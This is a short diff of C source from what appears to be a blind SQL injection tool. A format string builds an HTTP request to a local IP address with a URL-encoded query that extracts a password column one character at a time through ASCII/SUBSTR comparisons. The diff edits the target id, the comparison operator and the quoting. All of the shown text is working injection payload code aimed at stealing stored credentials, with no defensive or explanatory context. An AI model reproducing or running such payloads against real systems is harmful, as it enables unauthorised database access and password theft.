@@ -284,13 +284,13 @@ bool check_password(const void *ctx) {
         "%s%%20" // FROM `table_name`
         "WHERE%%20"
         "%s" // WHERE `id_col`
-        "%%3d211547005%%20"
+        "%%3d322695107%%20"
         "AND%%20"
         "%s%%20" // AND `pwd_col`...
         "LIKE%%20%%27%s%%25%%27%%20" // ...LIKE 'discovered%'
         "AND%%20ASCII(SUBSTR("
         "%s" // SUBSTR(`pwd_col`...)
-        ",%i,1))<%%3dASCII(%%27%s%%27)%%20"
+        ",%i,1))>%%3dASCII(%%22%s%%22)%%20"
         "LIMIT%%201;"
         " HTTP/1.1\r\n"
         "Host: 192.168.1.202\r\n"
